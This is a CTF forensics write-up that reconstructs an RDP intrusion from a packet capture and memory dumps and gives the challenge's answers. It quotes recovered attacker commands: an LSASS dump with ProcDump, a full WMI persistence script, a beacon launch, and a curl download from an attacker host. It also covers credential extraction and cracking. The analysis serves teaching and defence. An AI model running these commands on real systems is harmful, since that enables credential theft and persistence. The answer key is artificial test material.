# Remnant — Forensics Challenge Write-up
**Author:** Mohammed Ali  
**Difficulty:** Hard
**Category:** Digtal Forensics 


## Scenario

> We intercepted a dense web of courier transit-logs flowing through the
> capital's hidden service-throats. Sift through this captured chain of custody
> to uncover the counterfeit vows buried within the routine traffic. Retrace
> every forged witness-mark and stamped transfer to expose the architect behind
> the breach.

The supplied archive was `forensics_remnant.zip`. It contained two primary
artifacts:

- `capture.pcap` — network traffic from the affected environment.
- `so.dmp` — a Windows minidump of the attacker's beacon process on `JUMP01`.

The investigation ultimately exposed an RDP pivot, WMI event-subscription
persistence, process injection, an encrypted command-and-control channel, an
LSASS dump, and exfiltration to attacker-controlled Google Drive storage.

## Final answers

| Question | Answer |
|---|---|
| Password for the compromised account used to pivot into `JUMP01` | `CoffeeMonring@` |
| Exact WMI object name created for persistence | `SystemOptimize` |
| MD5 of the injected shellcode | `f77d42ed3d0bd6888cb85d742ba8ef19` |
| Unix timestamp of the successful upload from `JUMP01` | `1769849198` |
| Document stolen from the CFO's computer | `VCS-Internal-Report.pdf` |

The password is intentionally spelled `CoffeeMonring@`, with **Monring** rather
than **Morning**.

## Question-by-question solution

This section presents the shortest reproducible path to each requested answer.
The later sections explain the same artifacts in greater technical depth.

### Question 1 — What is the compromised account password?

**Answer: `CoffeeMonring@`**

#### Step 1: Identify the successful RDP connection

List the TLS Client Hello packets:

```bash
tshark -r evidence/capture.pcap \
  -Y 'tls.handshake.type == 1' \
  -T fields \
  -e frame.number \
  -e frame.time_epoch \
  -e ip.src \
  -e ip.dst \
  -e tcp.srcport \
  -e tcp.dstport \
  -e tls.handshake.random
```

The successful RDP connection was TCP stream `3`, from `172.168.200.57` to
`JUMP01` at `172.168.200.58:3389`. Its TLS Client Hello random was:

```text
697dc080b7a99b0141d0141d873cb4a4a1152e24c3ccb3693578c7ffb4b0c8be
```

#### Step 2: Recover the matching TLS secret

Searching the recovered LSASS dump for NSS key-log records produced a
`CLIENT_RANDOM` entry matching that Client Hello:

```bash
strings -el -n 8 evidence/jump01_dump/error.dmp |
  rg '^CLIENT_RANDOM ' |
  sort -u > evidence/tls_lsa_keylog.txt
```

The matching entry was:

```text
CLIENT_RANDOM 697DC080B7A99B0141D0141D873CB4A4A1152E24C3CCB3693578C7FFB4B0C8BE 3944135DB2720A1524A483D2FAA79CA7F34F2BAFE0F578BCD45153C7E5D919D7EF6908CA40CE697434BA9B15D0DA4B3C
```

#### Step 3: Decrypt RDP and identify the account

Load the key-log file into `tshark`:

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'tcp.stream == 3' \
  -T fields \
  -e frame.number \
  -e _ws.col.Protocol \
  -e _ws.col.Info
```

The CredSSP exchange then became readable:

```text
Frame 62  NTLMSSP_NEGOTIATE
Frame 63  NTLMSSP_CHALLENGE
Frame 65  NTLMSSP_AUTH, User: JUMP01\Administrator
```

This established that the attacker used `JUMP01\Administrator`.

#### Step 4: Extract the NTLMv2 challenge-response

Extract the relevant NTLM fields:

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'frame.number == 63 || frame.number == 65' \
  -T fields \
  -e frame.number \
  -e ntlmssp.ntlmserverchallenge \
  -e ntlmssp.auth.username \
  -e ntlmssp.auth.domain \
  -e ntlmssp.ntlmv2_response \
  -e ntlmssp.ntlmv2_response.ntproofstr
```

Important values:

```text
Username:         Administrator
Domain:           JUMP01
Server challenge: 715cb117f0e6f263
NTProofStr:       daecf5b9322aa30a56dd82ed2bdb1123
```

These values were assembled into a NetNTLMv2 hash in
`evidence/rdp_netntlmv2.hash`.

#### Step 5: Parse the exfiltrated LSASS dump

The attacker created `error.dmp` from `lsass.exe` and later uploaded it. After
downloading and extracting `JUMP01_error.dmp.zip`, parse the dump with
`pypykatz`.

Windows build `26100` used a newer MSV structure. Selecting
`PKIWI_MSV1_0_LIST_65` exposed the credentials:

```bash
pypykatz lsa minidump evidence/jump01_dump/error.dmp
```

Relevant output:

```text
Username: Administrator
Domain: JUMP01
NT: 7f166d02eb42dc07bacc8e83f02738dc

CREDMAN
username Administrator
domain TERMSRV/172.168.200.60
password CoffeeMonring@
```

#### Step 6: Verify the recovered password against the RDP login

Do not rely only on the Credential Manager entry. Verify the plaintext candidate
against the NetNTLMv2 response captured during the successful login:

```bash
printf 'CoffeeMonring@\n' |
  john --format=netntlmv2 --stdin evidence/rdp_netntlmv2.hash

john --format=netntlmv2 \
  --show evidence/rdp_netntlmv2.hash
```

John returned:

```text
Administrator:CoffeeMonring@:JUMP01:715cb117f0e6f263:...
```

Therefore:

```text
CoffeeMonring@
```

### Question 2 — What is the WMI persistence object name?

**Answer: `SystemOptimize`**

#### Step 1: Use the decrypted RDP stream

Use the same TLS key-log file recovered for Question 1:

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'tcp.stream == 3' \
  -T fields \
  -e frame.number \
  -e frame.time_epoch \
  -e _ws.col.Protocol \
  -e _ws.col.Info
```

#### Step 2: Locate clipboard transfers

The attacker copied commands from the source system and pasted them into the
RDP session. Filter the RDP clipboard virtual channel:

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'tcp.stream == 3 && rdp_cliprdr' \
  -T fields \
  -e frame.number \
  -e frame.time_epoch \
  -e ip.src \
  -e _ws.col.Info \
  -e rdp_cliprdr.ordertype \
  -e rdp_cliprdr.datalen
```

The relevant `CF_UNICODETEXT` response was frame `4359`, with 1,416 bytes of
clipboard data.

#### Step 3: Display the decrypted bytes

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'frame.number == 4359' \
  -x
```

Under the `Decrypted TLS` data source, decode the UTF-16LE clipboard text. It
contains:

```powershell
$F=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance();
$F.Name='SystemOptimize';

$C=([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance();
$C.Name='SystemOptimize';

$B=([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance();
$B.Filter=$F;
$B.Consumer=$C;
$B.Put() | Out-Null
```

#### Step 4: Validate the exact object name

Both the event filter and command-line consumer were explicitly assigned:

```text
SystemOptimize
```

The binding joined those two objects, confirming that this was the malicious
WMI persistence subscription.

### Question 3 — What is the MD5 of the injected shellcode?

**Answer: `f77d42ed3d0bd6888cb85d742ba8ef19`**

#### Step 1: Identify the beacon connection

The PCAP showed TLS traffic from `JUMP01` to the attacker:

```text
172.168.200.58:58578 -> 96.237.253.177:8443
```

The connection begins at frame `5239`.

#### Step 2: Recover the beacon's TLS keys from `so.dmp`

The beacon dump contained the TLS 1.3 application keys and IVs:

```text
Server key:
c13c1f5d3df0e2c840f5cb0208453f234ae2fd26b58cd8e99abf9f43141a1b5a

Server IV:
0448c4e1e737413cfc7aff22

Client key:
e207019e588235cebda524e3196d5363562cd2bebc9b5550aa8edb1f5923e498

Client IV:
e470d2fc259348ce0793de70
```

Use these values to decrypt the TLS 1.3 AES-GCM application records in TCP
stream `5`.

#### Step 3: Decode the application layer

Each decrypted C2 message still used a custom encoding:

1. Base64-decode the message.
2. Remove the first decoded byte.
3. XOR the remaining bytes with the repeating key:

```text
fsdgferhzdzxczevre5595485sdgd
```

This produced JSON tasking messages.

#### Step 4: Find the injection task

Decoded server message `26` contained:

```json
{
  "CM": "-r /clt/klg.bin 7628 ",
  "IF": "/clt/klg.bin",
  "INS": "inject",
  "PI": 7628,
  "DA": "<base64 shellcode>"
}
```

The `DA` field was the attached payload.

#### Step 5: Extract the payload

Base64-decode `DA` and save the resulting 292,264-byte file as:

```text
evidence/c2_S_messages/26_decoded_DA.bin
```

The beacon's reply contained:

```text
RV = UHJvY2VzcyBpbmplY3RlZC4=
```

Decoding `RV` produced:

```text
Process injected.
```

This confirms that the attached data was the payload successfully injected into
PID `7628`.

#### Step 6: Calculate the MD5

```bash
md5sum evidence/c2_S_messages/26_decoded_DA.bin
```

Output:

```text
f77d42ed3d0bd6888cb85d742ba8ef19  evidence/c2_S_messages/26_decoded_DA.bin
```

### Question 4 — When was data successfully uploaded?

**Answer: `1769849198`**

#### Step 1: Find the exfiltration task

The decoded C2 messages showed the attacker running:

```powershell
&"C:\Windows\Temp\CloudSyncer.exe" upload `
  "C:\Windows\Temp\error.dmp" `
  --compress
```

This identified `CloudSyncer.exe` as the exfiltration utility and `error.dmp`
as the sensitive data.

#### Step 2: Recover `CloudSyncer.exe`

The PCAP contained:

```text
GET /CloudSyncer.7z HTTP/1.1
Host: update.microsoft-windows.com:8888
```

The C2 showed that it was extracted with:

```powershell
7z.exe x CloudSyncer.7z -powersyncer
```

For 7-Zip, `-p` specifies the password, so the actual archive password was:

```text
owersyncer
```

#### Step 3: Decompile the utility

Extract the .NET single-file bundle and decompile it with ILSpy. The source
revealed:

- Google Drive OAuth configuration.
- A resumable upload implementation.
- A read-only download/listing configuration.
- The upload archive password:

```text
6\1p0`BeVm]7/S.
```

#### Step 4: Enumerate the attacker's storage

Use the tool's read-only storage access to list files. The resulting metadata
contained:

```text
Name:        JUMP01_error.dmp.zip
CreatedTime: 2026-01-31T08:46:38.613Z
Size:        126211706
```

The matching name and timestamp establish that this was the compressed
`error.dmp` uploaded from `JUMP01`.

#### Step 5: Convert the successful creation time

```bash
date -u -d '2026-01-31T08:46:38.613Z' +%s
```

Output:

```text
1769849198
```

The millisecond form is `1769849198.613`; the integer Unix timestamp requested
by the challenge is:

```text
1769849198
```

### Question 5 — What CFO document was stolen?

**Answer: `VCS-Internal-Report.pdf`**

#### Step 1: Reuse the recovered read-only storage access

The same attacker-storage listing used for Question 4 contained:

```text
VCS-EXEC-CFO-MRB-002_VCS-Internal-Report.pdf.zip
```

The `CFO` marker made this the relevant archive.

#### Step 2: Download the archive

Use the decompiled CloudSyncer download functionality or reproduce its Google
Drive download request using the recovered read-only authorization.

The sensitive OAuth values are deliberately not reproduced in this write-up.

#### Step 3: Open the archive

Use the compression password recovered from `ZipHelper.cs`:

```text
6\1p0`BeVm]7/S.
```

For example:

```bash
7z l \
  -p'6\1p0`BeVm]7/S.' \
  VCS-EXEC-CFO-MRB-002_VCS-Internal-Report.pdf.zip
```

#### Step 4: Read the contained filename

The archive member listing showed:

```text
VCS-Internal-Report.pdf
```

That exact member name, rather than the longer storage archive name, is the
answer requested by the challenge.

## Evidence integrity

The following SHA-256 hashes were calculated during the investigation:

```text
c44e49c7e1fc9cedc4ddeff4be7d12ca4acb10d5ee0fe915ba410b58c8f5a828  forensics_remnant.zip
04fd179b2d583b5d079b6b2305679f5140d01624844f3c8544c49e832ed6a283  capture.pcap
91a87aaa1d23a56fe10568ec03852206a71c07bb6647340fc65780bb406981e3  so.dmp
10958bb7fba9413c98029039fda366f701c66c8b28f5d900b1a9e4a67ba07397  error.dmp
9233c6baea23a951560f98e5fc7881cc1c0367b7b1897b589523f66ad40427dd  JUMP01_error.dmp.zip
b976d792e8ced7e68f57bc1b1bcaffff441df0894be32710c1c854badf7f9e01  injected shellcode
```

## 1. Initial network triage

The hosts most relevant to the intrusion were:

| Address | Role |
|---|---|
| `172.168.200.57` | Attacker-controlled or previously compromised pivot source |
| `172.168.200.58` | `JUMP01` |
| `96.237.253.177` | Attacker infrastructure |

Traffic analysis showed:

- RDP from `172.168.200.57` to `172.168.200.58:3389`.
- TLS command-and-control traffic from `JUMP01` to
  `96.237.253.177:8443`.
- An HTTP download from the attacker infrastructure on TCP port `8888`.
- Later HTTPS traffic associated with Google APIs and the exfiltration tool.

Useful triage commands included:

```bash
tshark -r evidence/capture.pcap \
  -q -z conv,tcp

tshark -r evidence/capture.pcap \
  -Y 'tls.handshake.type == 1' \
  -T fields \
  -e frame.number \
  -e frame.time_epoch \
  -e ip.src \
  -e ip.dst \
  -e tcp.srcport \
  -e tcp.dstport \
  -e tls.handshake.random
```

The successful RDP session began with this TLS Client Hello:

```text
Frame:         58
Time:          1769848966.624114
Source:        172.168.200.57:49297
Destination:   172.168.200.58:3389
Client random: 697dc080b7a99b0141d0141d873cb4a4a1152e24c3ccb3693578c7ffb4b0c8be
```

The C2 connection began at frame `5239`:

```text
Time:        1769849045.733754
Source:      172.168.200.58:58578
Destination: 96.237.253.177:8443
```

## 2. Recovering TLS secrets from memory

The network traffic was encrypted, so the `so.dmp` process dump was searched for
cryptographic material. The dump contained usable TLS key material for the
beacon connection.

The recovered TLS 1.3 application keys were:

```text
Server key:
c13c1f5d3df0e2c840f5cb0208453f234ae2fd26b58cd8e99abf9f43141a1b5a

Server IV:
0448c4e1e737413cfc7aff22

Client key:
e207019e588235cebda524e3196d5363562cd2bebc9b5550aa8edb1f5923e498

Client IV:
e470d2fc259348ce0793de70
```

The C2 used TLS 1.3 with AES-GCM. For each TLS application record, the nonce was
formed by XORing the static IV with the padded record sequence number. The
record header was supplied as the GCM additional authenticated data.

The LSASS dump recovered later in the investigation also contained TLS logging
data. The following NSS key-log entry matched the successful RDP Client Hello:

```text
CLIENT_RANDOM 697DC080B7A99B0141D0141D873CB4A4A1152E24C3CCB3693578C7FFB4B0C8BE 3944135DB2720A1524A483D2FAA79CA7F34F2BAFE0F578BCD45153C7E5D919D7EF6908CA40CE697434BA9B15D0DA4B3C
```

Supplying the recovered key-log file to Wireshark or `tshark` decrypted the
entire successful RDP session:

```bash
tshark -r evidence/capture.pcap \
  -o tls.keylog_file:evidence/tls_lsa_keylog.txt \
  -Y 'tcp.stream == 3' \
  -T fields \
  -e frame.number \
  -e frame.time_epoch \
  -e _ws.col.Protocol \
  -e _ws.col.Info
```

The decrypted CredSSP exchange identified the account used for the pivot:

```text
Frame 62: NTLMSSP_NEGOTIATE
Frame 63: NTLMSSP_CHALLENGE
Frame 65: NTLMSSP_AUTH, User: JUMP01\Administrator
```

## 3. Recovering the compromised account password

The decrypted RDP authentication exposed an NTLMv2 challenge-response:

```text
Username:        Administrator
Domain:          JUMP01
Server challenge: 715cb117f0e6f263
NTProofStr:       daecf5b9322aa30a56dd82ed2bdb1123
```

The complete NTLMv2 response was converted into John the Ripper's
`netntlmv2` format:

```text
Administrator::JUMP01:715cb117f0e6f263:daecf5b9322aa30a56dd82ed2bdb1123:0101000000000000bc2aae928d92dc018a428a66c36769770000000002000c004a0055004d0050003000310001000c004a0055004d0050003000310004000c004a0055004d0050003000310003000c004a0055004d0050003000310007000800bc2aae928d92dc0106000400020000000800300030000000000000000000000000300000c6b4301c9484e86c14cd27672a782455c16b1fe134dfa87ad8dacb22b5ad058e0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100370032002e003100360038002e003200300030002e0035003800000000000000000000000000
```

Separately, the exfiltrated LSASS dump was parsed. Windows build `26100`
required the newer `KIWI_MSV1_0_LIST_65` layout. Once the correct structure was
selected, the active and cached credentials became readable:

```text
Username: Administrator
Domain:   JUMP01
NT hash:  7f166d02eb42dc07bacc8e83f02738dc

CREDMAN target:   TERMSRV/172.168.200.60
CREDMAN username: Administrator
CREDMAN password: CoffeeMonring@
```

The recovered plaintext candidate was verified against the NTLMv2
challenge-response from the successful RDP login:

```bash
printf 'CoffeeMonring@\n' |
  john --format=netntlmv2 --stdin evidence/rdp_netntlmv2.hash

john --format=netntlmv2 --show evidence/rdp_netntlmv2.hash
```

John confirmed:

```text
Administrator:CoffeeMonring@:JUMP01:715cb117f0e6f263:...
```

Therefore, the password used for the compromised account was:

```text
CoffeeMonring@
```

## 4. Recovering the WMI persistence command

After decrypting RDP, the client's keyboard and clipboard activity could be
examined. The attacker pasted commands into the remote system using the RDP
clipboard virtual channel.

Three especially useful clipboard responses appeared at:

| Frame | Clipboard data length | Purpose |
|---|---:|---|
| `4078` | 116 bytes | Create an LSASS dump with ProcDump |
| `4359` | 1,416 bytes | Create the WMI persistence subscription |
| `4541` | 184 bytes | Start the beacon manually |

The first pasted command was:

```powershell
C:\Windows\Temp\prcd.exe -accepteula -ma lsass.exe error
```

The WMI persistence command reconstructed from frame `4359` was:

```powershell
$F=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance();
$F.Name='SystemOptimize';
$F.QueryLanguage='WQL';
$F.EventNamespace='root\cimv2';
$F.Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime>=200 AND TargetInstance.SystemUpTime<320";
$F.Put() | Out-Null;

$C=([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance();
$C.Name='SystemOptimize';
$C.CommandLineTemplate='C:\Windows\Temp\so.exe update.microsoft-windows.com 8443 https';
$C.Put() | Out-Null;

$B=([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance();
$B.Filter=$F;
$B.Consumer=$C;
$B.Put() | Out-Null
```

This created:

- A `__EventFilter` named `SystemOptimize`.
- A `CommandLineEventConsumer` named `SystemOptimize`.
- A `__FilterToConsumerBinding` joining the two objects.

The event query watches system uptime and triggers while uptime is from 200
through 319 seconds. When triggered, the consumer launches:

```text
C:\Windows\Temp\so.exe update.microsoft-windows.com 8443 https
```

The separate manual-start command pasted later was:

```text
pse.exe -s -accepteula -i -d C:\Windows\Temp\so.exe update.microsoft-windows.com 8443 https
```

Both named WMI objects use the exact name:

```text
SystemOptimize
```

## 5. Decoding the command-and-control protocol

Decrypting TLS revealed that the application data still used a second encoding
layer. Each C2 message was decoded as follows:

1. Base64-decode the message.
2. Discard the first decoded byte.
3. XOR the remaining bytes with the repeating key:

```text
fsdgferhzdzxczevre5595485sdgd
```

The result was JSON containing tasking and replies. Useful fields included:

| Field | Meaning |
|---|---|
| `HN` | Hostname |
| `UN` | Username |
| `PID` | Beacon PID |
| `INS` | Instruction or module name |
| `CM` | Command |
| `DA` | Attached binary data |
| `RV` | Returned value |

The beacon identified itself as:

```text
Hostname:  JUMP01
Address:   172.168.200.58
User:      NT AUTHORITY\SYSTEM
Process:   so.exe
PID:       9552
Integrity: HIGH
```

The decoded task flow included:

1. Load `ListDirectory.dll`.
2. Load `Inject.dll`.
3. Send `/clt/klg.bin` as a `DA` attachment.
4. Inject it into PID `7628`.
5. Load `Shell.dll`.
6. Download `CloudSyncer.7z`.
7. Load `Powershell.dll`.
8. Extract and execute `CloudSyncer.exe`.
9. Compress and upload `error.dmp`.

## 6. Extracting and hashing the injected shellcode

The injection task was present in decoded server message `26`:

```json
{
  "CM": "-r /clt/klg.bin 7628 ",
  "IF": "/clt/klg.bin",
  "INS": "inject",
  "PI": 7628,
  "UID": "3Sm8jKjt",
  "DA": "<base64 data>"
}
```

The `DA` field contained the shellcode. After Base64 decoding it, the resulting
file was 292,264 bytes long:

```text
evidence/c2_S_messages/26_decoded_DA.bin
```

The implant confirmed successful injection in its reply:

```json
{
  "CM": "-r /clt/klg.bin 7628 ",
  "INS": "inject",
  "RV": "UHJvY2VzcyBpbmplY3RlZC4="
}
```

Base64-decoding `RV` gives:

```text
Process injected.
```

The MD5 was then calculated:

```bash
md5sum evidence/c2_S_messages/26_decoded_DA.bin
```

Result:

```text
f77d42ed3d0bd6888cb85d742ba8ef19
```

## 7. CloudSyncer download and reverse engineering

The decoded C2 task downloaded an encrypted archive from the attacker's server:

```text
curl update.microsoft-windows.com:8888/CloudSyncer.7z -o "C:\Windows\Temp\CloudSyncer.7z"
```

The corresponding plaintext HTTP traffic was:

```text
Frame 6017
Time:   1769849081.057464
GET /CloudSyncer.7z
Host: update.microsoft-windows.com:8888

Frame 6867
Time:   1769849081.163004
HTTP 200
```

The archive was extracted by the attacker with:

```powershell
&"C:\Program Files\7-Zip\7z.exe" x `
  "C:\Windows\Temp\CloudSyncer.7z" `
  -powersyncer `
  -o"C:\Windows\Temp" -y
```

The `7z` syntax is important: `-p` selects the password option, so the literal
password is the remainder of the argument:

```text
owersyncer
```

It is **not** `powersyncer`.

`CloudSyncer.exe` was a .NET single-file bundle. Extracting the bundle and
decompiling it revealed:

- Google OAuth client configuration.
- Separate upload and read-only download refresh tokens.
- Google Drive file listing, download, and resumable upload code.
- Automatic password-protected compression before upload.

The live OAuth values are intentionally omitted from this public write-up.
They are not needed to reproduce the forensic conclusions and should be
treated as sensitive credentials.

The hard-coded archive password used for exfiltrated files was:

```text
6\1p0`BeVm]7/S.
```

The backtick is a literal character.

## 8. Identifying the successful upload timestamp

The C2 instructed `JUMP01` to upload the LSASS dump:

```powershell
&"C:\Windows\Temp\CloudSyncer.exe" upload `
  "C:\Windows\Temp\error.dmp" `
  --compress
```

`--compress` caused the tool to create the protected archive before using the
Google Drive resumable upload API.

The attacker-storage listing contained:

```text
Name:         JUMP01_error.dmp.zip
Created time: 2026-01-31T08:46:38.613Z
Modified:     2026-01-31T08:46:38.613Z
Size:         126,211,706 bytes
```

Converting the UTC creation time to Unix time:

```bash
date -u -d '2026-01-31T08:46:38.613Z' +%s
```

Result:

```text
1769849198
```

The fractional form is `1769849198.613`, but the requested Unix timestamp is:

```text
1769849198
```

## 9. Finding the stolen CFO document

Using the read-only download functionality recovered from `CloudSyncer.exe`,
the attacker's storage was enumerated. Relevant entries included:

```text
JUMP01_error.dmp.zip
VCS-EXEC-CFO-MRB-002_VCS-Internal-Report.pdf.zip
```

The CFO archive metadata was:

```text
Name:         VCS-EXEC-CFO-MRB-002_VCS-Internal-Report.pdf.zip
Created time: 2026-02-03T17:21:26.709Z
Size:         9,432 bytes
```

After downloading the archive and opening it with the hard-coded compression
password, its member listing showed:

```text
VCS-Internal-Report.pdf
```

Therefore, the document stolen from the CFO's computer was:

```text
VCS-Internal-Report.pdf
```

## 10. Attack timeline

| UTC time | Unix time | Event |
|---|---:|---|
| 2026-01-31 08:42:46.624 | `1769848966.624` | Successful RDP TLS session begins |
| 2026-01-31 08:42:52.038 | `1769848972.038` | CredSSP authenticates `JUMP01\Administrator` |
| 2026-01-31 08:43:12.006 | `1769848992.006` | ProcDump command transferred through the RDP clipboard |
| 2026-01-31 08:43:31.201 | `1769849011.201` | WMI persistence command transferred |
| 2026-01-31 08:43:42.583 | `1769849022.583` | Beacon manual-start command transferred |
| 2026-01-31 08:44:05.734 | `1769849045.734` | Beacon begins TLS C2 communication |
| 2026-01-31 08:44:41.057 | `1769849081.057` | `CloudSyncer.7z` requested from attacker server |
| 2026-01-31 08:44:41.163 | `1769849081.163` | Attacker server returns HTTP 200 |
| 2026-01-31 08:46:38.613 | `1769849198.613` | `JUMP01_error.dmp.zip` created in attacker storage |

## 11. Indicators of compromise

### Network indicators

```text
96.237.253.177
update.microsoft-windows.com
update.microsoft-windows.com:8443
update.microsoft-windows.com:8888
```

### Files

```text
C:\Windows\Temp\so.exe
C:\Windows\Temp\prcd.exe
C:\Windows\Temp\error.dmp
C:\Windows\Temp\CloudSyncer.7z
C:\Windows\Temp\CloudSyncer.exe
```

### WMI artifacts

```text
Namespace: root\subscription
Filter:    SystemOptimize
Consumer:  SystemOptimize
```

### Account activity

```text
Account: JUMP01\Administrator
Source:  172.168.200.57
Target:  172.168.200.58:3389
```

### Shellcode hashes

```text
MD5:    f77d42ed3d0bd6888cb85d742ba8ef19
SHA256: b976d792e8ced7e68f57bc1b1bcaffff441df0894be32710c1c854badf7f9e01
```

## Conclusion

The attacker authenticated to `JUMP01` as the local `Administrator` account
using the reused password `CoffeeMonring@`. During the decrypted RDP session,
they dumped LSASS and created a permanent WMI event subscription named
`SystemOptimize`, configured to execute `so.exe`.

The beacon connected to attacker infrastructure over encrypted TLS, accepted a
shellcode injection task, downloaded `CloudSyncer.exe`, and uploaded the
compressed LSASS dump to attacker-controlled Google Drive storage. Reverse
engineering the upload tool exposed its storage access mechanism and archive
password, allowing the storage contents to be enumerated. This established the
successful upload time and identified the CFO document as
`VCS-Internal-Report.pdf`.


### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon


